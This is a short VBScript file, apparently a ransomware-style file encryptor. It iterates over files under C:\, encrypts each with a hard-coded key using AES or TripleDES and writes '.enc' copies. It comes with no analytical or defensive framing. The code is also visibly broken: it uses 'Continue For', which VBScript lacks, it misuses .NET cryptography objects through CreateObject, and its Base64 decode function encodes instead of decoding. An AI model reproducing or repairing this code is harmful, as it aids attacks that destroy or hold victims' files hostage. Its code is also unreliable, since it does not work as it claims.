Dim fso, key, encryptedData, originalData

Set fso = CreateObject("Scripting.FileSystemObject")


key = "ee1a00e8a2b4a35e81d57e9ffc4b360fa36a312e"

' Start directory
inputDir = "C:\"

' encryption algorithm (AES)
algorithm = "AES"

' Main encryption loop
Set files = fso.GetFolder(inputDir).GetFolder("*").Files

For Each file In files
    ' Skip hidden files
    If Left(file.Name, 1) = "." Then Continue For

    ' Open files
    Set originalData = fso.OpenTextFile(file, 1)

    ' Convert key to binary
    Set keyObject = CreateObject("System.Security.Cryptography.CryptoStream", CreateObject("System.IO.MemoryStream").Write(Base64Decode(key)), CreateObject("System.Security.Cryptography.FromBase64Transform"))
    keyObject.Flush()
    keyBytes = keyObject.ReadStream.ReadToText()

    ' Encrypt data
    If algorithm = "AES" Then
        Set encryptor = CreateObject("System.Security.Cryptography.AesCryptoServiceProvider").CreateEncryptor(keyBytes, 0)
    Else
        Set encryptor = CreateObject("System.Security.Cryptography.TripleDESCryptoServiceProvider").CreateEncryptor(keyBytes, 0)
    End If
    encryptedData = encryptor.TransformFinalBlock(originalData.ReadAll)

    ' Close original file
    originalData.Close

    ' Create new encrypted file with .enc extension
    Set outputFile = fso.CreateTextFile(fso.BuildPath(file.Path) & ".enc", True)

    ' Write encrypted data and close file
    outputFile.Write encryptedData
    outputFile.Close
Next

MsgBox "Encryption completed!"

Function Base64Decode(data)
    Dim decoder
    Set decoder = CreateObject("System.Security.Cryptography.CryptoStream")
    decoder.SetSource(CreateObject("System.IO.MemoryStream").Write(data))
    decoder.SetTransform(CreateObject("System.Security.Cryptography.ToBase64Transform"))
    decoder.Flush()

    Base64Decode = decoder.ReadStream.ReadToText()
End Function
